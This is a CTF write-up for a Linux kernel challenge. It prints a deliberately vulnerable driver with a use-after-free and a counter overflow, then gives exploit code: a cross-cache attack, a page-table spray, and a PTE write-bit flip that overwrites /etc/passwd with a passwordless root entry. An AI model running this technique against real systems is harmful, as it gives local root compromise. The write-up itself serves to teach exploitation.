## Challenge Overview
It is a kernel PWN challenge that exposes vulnerable kernel driver:

```c
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/mutex.h>
#include <linux/slab.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ptr-yudai");
MODULE_DESCRIPTION("A vulnerable driver for a CTF");

#define CMD_ALLOC   0x0268
#define CMD_INC     0x0298
#define CMD_SEL     0x01c1
#define CMD_DELETE  0x0831

#define MAX_OBJ_NUM 0x100
#define PAD_SIZE    0x7f8

struct obj {
  char buf[PAD_SIZE];
  size_t cnt;
};

static struct kmem_cache *obj_cachep;
static DEFINE_MUTEX(module_lock);

unsigned char inc_used = 0;
struct obj *selected = 0;
struct obj *obj_array[MAX_OBJ_NUM] = { NULL };

static long module_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
  long ret = -EINVAL;
  mutex_lock(&module_lock);

  if (arg >= MAX_OBJ_NUM)
    goto out;

  switch (cmd) {
    case CMD_ALLOC:
      obj_array[arg] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);
      ret = 0;
      break;

    case CMD_SEL:
      if (!obj_array[arg])
        goto out;
      selected = obj_array[arg];
      ret = 0;
      break;

    case CMD_INC:
      if (inc_used++ > 1)
        goto out;
      selected->cnt++;
      ret = 0;
      break;

    case CMD_DELETE:
      if (!obj_array[arg])
        goto out;
      kmem_cache_free(obj_cachep, obj_array[arg]);
      obj_array[arg] = NULL;
      ret = 0;
      break;
  }

 out:
  mutex_unlock(&module_lock);
  return ret;
}

static struct file_operations module_fops = {
  .owner          = THIS_MODULE,
  .unlocked_ioctl = module_ioctl,
};

static struct miscdevice vuln_dev = {
  .minor = MISC_DYNAMIC_MINOR,
  .name = "vuln",
  .fops = &module_fops
};

static int __init module_initialize(void) {
  if (misc_register(&vuln_dev) != 0)
    return -EBUSY;

  obj_cachep = KMEM_CACHE(obj, 0);
  if (!obj_cachep) {
    misc_deregister(&vuln_dev);
    return -EBUSY;
  }

  return 0;
}

static void __exit module_cleanup(void) {
  misc_deregister(&vuln_dev);
  mutex_destroy(&module_lock);
}

module_init(module_initialize);
module_exit(module_cleanup);
```

Vulnerability is pretty obvious, if we select an object, the reference is not cleared after the object is freed, which gives us UAF vulnerability. We don't have any read primitive, so we'll have to either pwn it leaklessly, or bypass KASLR in some clever way. Only write primitive is incrementing selected value by 1. This condition:

```c
      if (inc_used++ > 1)
        goto out;
```

seemingly restricts us to only 2 increments, but `inc_used` is declared as `unsigned char`, so because of integer overflow, we can increment infinitely many times.

The module allocates its own cache:

```c
obj_cachep = KMEM_CACHE(obj, 0);
```

which means we'll most likely have to use cross-cache attack to be able to overwrite anything useful.

## Choosing kernel structure to attack

We can only write to a specific offset:

```c
#define PAD_SIZE    0x7f8

struct obj {
  char buf[PAD_SIZE];
  size_t cnt;
};
```

and because we can only increment, choosing structures containing pointers is most likely a bad idea. We could think about finding a structure that has something like a `size` field at that offset, but there is another type of variable that would be ideal to attack under such conditions - flags. By incrementing the value, we could flip some binary flag from 0 to 1, or from 1 to 0. Ideal structure to attack would be PTE (page table entry), which is a 64-bit value that holds information related to virtual memory pages:

```c
#define _PAGE_BIT_PRESENT	0	/* is present */
#define _PAGE_BIT_RW		1	/* writeable */
#define _PAGE_BIT_USER		2	/* userspace addressable */
#define _PAGE_BIT_PWT		3	/* page write through */
#define _PAGE_BIT_PCD		4	/* page cache disabled */
#define _PAGE_BIT_ACCESSED	5	/* was accessed (raised by CPU) */
#define _PAGE_BIT_DIRTY		6	/* was written to (raised by CPU) */
#define _PAGE_BIT_PSE		7	/* 4 MB (or 2MB) page */
#define _PAGE_BIT_PAT		7	/* on 4KB pages */
#define _PAGE_BIT_GLOBAL	8	/* Global TLB entry PPro+ */
#define _PAGE_BIT_SOFTW1	9	/* available for programmer */
#define _PAGE_BIT_SOFTW2	10	/* " */
#define _PAGE_BIT_SOFTW3	11	/* " */
#define _PAGE_BIT_PAT_LARGE	12	/* On 2MB or 1GB pages */
#define _PAGE_BIT_SOFTW4	57	/* available for programmer */
#define _PAGE_BIT_SOFTW5	58	/* available for programmer */
#define _PAGE_BIT_PKEY_BIT0	59	/* Protection Keys, bit 1/4 */
#define _PAGE_BIT_PKEY_BIT1	60	/* Protection Keys, bit 2/4 */
#define _PAGE_BIT_PKEY_BIT2	61	/* Protection Keys, bit 3/4 */
#define _PAGE_BIT_PKEY_BIT3	62	/* Protection Keys, bit 4/4 */
#define _PAGE_BIT_NX		63	/* No execute: only valid after cpuid check */
```

the part that interests us is `_PAGE_BIT_RW`. It might seem useless at first glance, because in userspace we could just use mprotect to change R/W mapping, but there is one exception - memory mapped to files. If we mmap a file we have no write permission for, flipping RW bit would actually create very easy path to privilege escalation, just overwrite /etc/passwd and get root.

## Exploitation

First, we'll have to execute cross-cache attack:

```c
  fd = open("/dev/vuln", O_RDONLY);
  assert(fd != -1);

  int objs_per_slab = 8;
  int cpu_partial = 6;

  int num_spray = objs_per_slab * (cpu_partial + 1);

  printf("Allocating %#x objects to obtain %#x full slabs\n", num_spray, cpu_partial + 1);
  for (int i = 0; i < num_spray; i++) {
      obj_alloc(i);
  }

  int obj_sel_id = 0;
  printf("Selecting object %d\n", obj_sel_id);
  obj_sel(obj_sel_id);

  puts("Allocating 0x1 object to obtain new active slab");
  obj_alloc(num_spray);

  puts("Freeing objects to release pages back to the buddy allocator");
  for (int i = 0; i < num_spray; i += objs_per_slab) {
    printf("Freeing objects from slab %d\n", i / objs_per_slab);
    for (int j = i; j < i + objs_per_slab; j++) {
      obj_delete(j);
    }
  }
```

we free 1 more slab than can fit into cpu partial list, so the page gets returned to the buddy allocator. Before freeing, we have to select the object from the slab that gets returned.
Next, we spray `mmap`s to force kernel to allocate page table entries:

```c
  puts("Spraying user pagetables to reclaim pages");
  
  int file_fd = open("/etc/passwd", O_RDONLY);
  assert(file_fd != -1);
  
  for (int i = 0; i < NUM_PAGE_TABLE_SPRAY ; i++) {
    size_t mmap_addr = 0xdead0000000UL + 0x200000 * i;
    size_t mmap_addr_7f8 = mmap_addr + 0xff000;
    if (mmap((void *)mmap_addr, PAGE_SIZE, PROT_READ, MAP_SHARED | MAP_FIXED_NOREPLACE, file_fd, 0) == MAP_FAILED) {
      printf("Failed to mmap %#lx\n", mmap_addr);
      exit(1);
    }
    *(volatile char*)mmap_addr;
    if (mmap((void *)mmap_addr_7f8, PAGE_SIZE, PROT_READ, MAP_SHARED | MAP_FIXED_NOREPLACE, file_fd, 0) == MAP_FAILED) {
      printf("Failed to mmap %#lx\n", mmap_addr_7f8);
      exit(1);
    }
    *(volatile char*)mmap_addr_7f8;
    if (i % 0x20 == 0) {
      printf("Sprayed %#x pagetables\n", i);
    }
  }
```

This is a very important step to understand. Virtual memory in linux is divided into layers. For each 2MB of virtual memory linux kernel allocates one 0-order page, where it keeps 512 page table entries (512 * 0x1000 == 0x200000) - this is the bottom layer. That's why we have to add `0x200000 * i` to each `mmap_addr`, we want to force kernel to get new page from buddy allocator each time.
Another important part is `mmap_addr + 0xff000`. Our vulnerable driver increments value at offset `0x7f8`, therefore PTE of our mmapped page has to be exactly at that offset. Value `0xff000` could be calculated using simple math:

```python
>>> hex((0x7f8//8) * 0x1000)
'0xff000'
```

After that, we increment our object, and overwrite /etc/passwd:

```c
  puts("Overwriting PTE of the victim object to gain RW permissions");
  obj_inc(1);
  obj_inc(1);

  puts("Overwriting /etc/passwd");
  system("echo -e 'root::0:0:root:/root:/bin/sh' > /tmp/evil");
  int evil_fd = open("/tmp/evil", O_RDONLY);
  assert(evil_fd != -1);
  struct stat evil_stat;
  assert(fstat(evil_fd, &evil_stat) != -1);

  for (int i = 0; i < NUM_PAGE_TABLE_SPRAY ; i++) {
      if (pread(evil_fd, (char *)((0xdead0000000UL + 0x200000 * i) + 0xff000), evil_stat.st_size, 0) != -1) {
          puts("Success");
          exit(0);
      }
  }  
```

`pread` is used because it doesn't crash our program when trying to read into read-only memory.
